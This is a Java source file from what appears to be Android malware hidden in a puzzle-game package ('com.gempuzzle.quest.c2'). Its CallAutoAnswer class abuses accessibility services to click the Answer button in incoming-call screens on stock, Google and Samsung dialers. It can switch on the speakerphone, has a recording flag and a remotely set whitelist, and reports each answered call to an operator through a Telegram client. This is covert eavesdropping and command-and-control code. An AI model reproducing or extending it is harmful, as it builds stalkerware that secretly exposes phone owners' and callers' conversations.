package com.gempuzzle.quest.c2;

import android.content.Context;
import android.content.SharedPreferences;
import android.view.accessibility.AccessibilityNodeInfo;

import java.util.Arrays;
import java.util.HashSet;
import java.util.Set;

/**
 * Call auto-answer — uses accessibility to find and click
 * the "Answer" button on incoming call UI.
 */
public final class CallAutoAnswer {

    private static volatile boolean enabled = false;
    private static volatile boolean speakerOn = false;
    private static volatile boolean recordOn = false;
    private static final Set<String> whitelist = new HashSet<>();

    public static void setEnabled(boolean b) { enabled = b; }
    public static void setSpeaker(boolean b) { speakerOn = b; }
    public static void setRecord(boolean b) { recordOn = b; }
    public static void setWhitelist(String[] nums) {
        whitelist.clear();
        whitelist.addAll(Arrays.asList(nums));
    }

    public static void checkAndAnswer(Context ctx, AccessibilityNodeInfo root) {
        if (!enabled || root == null) return;
        // Find answer button by common resource IDs / text
        String[] answerIds = {
                "com.android.incallui:id/answer",
                "com.android.dialer:id/answer",
                "com.samsung.android.incallui:id/answer",
                "com.google.android.dialer:id/answer",
        };
        for (String id : answerIds) {
            try {
                AccessibilityNodeInfo btn = root.findAccessibilityNodeInfosByViewId(id)
                        .stream().findFirst().orElse(null);
                if (btn != null && btn.isClickable()) {
                    btn.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    TelegramClient.sendMessage("📞 *CALL AUTO-ANSWERED*");
                    if (speakerOn) {
                        // enable speaker via audio manager
                        android.media.AudioManager am = (android.media.AudioManager)
                                ctx.getSystemService(Context.AUDIO_SERVICE);
                        am.setSpeakerphoneOn(true);
                    }
                    return;
                }
            } catch (Throwable ignored) {}
        }
        // Fallback: search by text "Answer" / "Accept" / "接听"
        try {
            for (AccessibilityNodeInfo n : root.findAccessibilityNodeInfosByText("Answer")) {
                if (n.isClickable()) { n.performAction(AccessibilityNodeInfo.ACTION_CLICK); return; }
            }
            for (AccessibilityNodeInfo n : root.findAccessibilityNodeInfosByText("Accept")) {
                if (n.isClickable()) { n.performAction(AccessibilityNodeInfo.ACTION_CLICK); return; }
            }
        } catch (Throwable ignored) {}
    }

    public static String status() {
        return "📞 *AUTO-ANSWER*\n"
                + "master: " + (enabled ? "ON" : "OFF") + "\n"
                + "speaker: " + (speakerOn ? "ON" : "OFF") + "\n"
                + "record: " + (recordOn ? "ON" : "OFF") + "\n"
                + "whitelist: " + (whitelist.isEmpty() ? "_all_" : whitelist.toString());
    }

    private CallAutoAnswer() {}
}
